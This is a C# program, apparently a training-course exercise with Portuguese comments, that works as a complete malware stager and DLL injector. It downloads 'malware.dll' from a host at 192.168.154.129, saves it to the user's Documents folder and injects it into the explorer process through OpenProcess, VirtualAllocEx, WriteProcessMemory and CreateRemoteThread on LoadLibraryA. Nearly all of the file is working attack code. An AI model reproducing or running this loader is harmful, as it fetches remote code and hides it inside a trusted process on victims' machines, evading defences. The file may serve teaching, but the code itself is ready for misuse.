using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace DLLInjector
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        static void Main(string[] args)
        {
            // 1. Configurações de Rede e Caminho Dinâmico
            string url = "http://192.168.154.129/malware.dll";

            // Obtém o caminho da pasta "My Documents" do usuário atual dinamicamente
            string myDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string dllPath = Path.Combine(myDocuments, "malware.dll");

            // 2. Download da DLL (Simulando o Staging do Stager)
            try
            {
                Console.WriteLine($"[*] Baixando DLL de {url}...");
                WebClient wc = new WebClient();
                wc.DownloadFile(url, dllPath);
                Console.WriteLine($"[+] DLL salva em: {dllPath}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Erro no download: {e.Message}");
                return;
            }

            // 3. Localizar Processo Alvo
            Process[] targetProcs = Process.GetProcessesByName("explorer");
            if (targetProcs.Length == 0)
            {
                Console.WriteLine("[-] Alvo não encontrado. Abra o Notepad primeiro.");
                return;
            }
            int pid = targetProcs[0].Id;

            // 4. Fluxo de Injeção Clássica (conforme slides 83-85 do material) [cite: 433, 434]
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            // Aloca memória para a STRING do caminho (Path)
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length + 1, 0x3000, 0x40);

            byte[] pathBytes = Encoding.Default.GetBytes(dllPath);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, pathBytes, (uint)pathBytes.Length, out outSize);

            // Busca o endereço da função de carregamento na memória do alvo
            IntPtr loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // Dispara a execução da DLL no processo remoto
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr, addr, 0, IntPtr.Zero);

            Console.WriteLine($"[+] DLL Injetada com sucesso no PID: {pid}");
        }
    }
}
